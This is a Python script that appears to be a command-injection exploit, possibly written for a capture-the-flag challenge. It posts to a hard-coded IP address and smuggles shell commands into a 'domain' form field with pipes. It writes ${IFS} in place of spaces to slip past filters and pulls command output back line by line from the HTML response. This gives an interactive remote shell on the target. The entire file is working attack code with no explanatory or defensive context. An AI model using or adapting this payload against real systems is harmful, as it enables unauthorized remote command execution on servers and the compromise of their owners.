import requests as req
from bs4 import *

def main(cmd):
    cmd = cmd.replace(" ", "${IFS}")
    x = 1    
    while True:
        res = req.post("http://103.41.207.206:13005/who", data={'domain':"|" + cmd + "|head${IFS}-n${IFS}"+ str(x) + "|tail${IFS}-n${IFS}1"}).text
        # print(cmd + "|head${IFS}-n${IFS}"+ str(x) + "|tail${IFS}-n${IFS}1")
        bs_curr = BeautifulSoup(res, 'html.parser').find("input").get("placeholder")
        c = 0
        print(bs_curr)
        for y in range(1, 6):
            next_res = req.post("http://103.41.207.206:13005/who", data={'domain':"|" + cmd + "|head${IFS}-n${IFS}"+ str(x+y) + "|tail${IFS}-n${IFS}1"}).text
            bs_next = BeautifulSoup(next_res, 'html.parser').find("input").get("placeholder")
            
            if bs_next == bs_curr:
                c += 1
            if c == 5:
                return 1        
        x += 1
    
if __name__ == '__main__':
    while True:
        main(input("$> "))


